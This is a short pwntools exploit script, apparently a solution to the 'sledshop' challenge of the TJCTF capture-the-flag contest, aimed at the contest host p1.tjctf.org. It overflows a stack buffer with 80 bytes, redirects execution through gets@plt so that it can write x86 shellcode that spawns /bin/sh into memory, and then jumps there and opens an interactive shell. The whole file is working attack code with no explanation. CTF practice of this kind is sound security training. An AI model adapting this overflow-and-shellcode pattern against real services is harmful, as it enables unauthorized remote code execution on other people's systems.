from pwn import *

#a = process('./sledshop')
a = remote('p1.tjctf.org', 8010)
#raw_input('hello')
shell = "\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 

getplt = 0x080483d0

shelladd = 0x0804a000

buff = 'a'*80 + p32(getplt) + p32(shelladd) + p32(shelladd)

a.sendline(buff)
#shell = asm(shellcraft.sh())

a.sendline(shell) 
a.interactive()
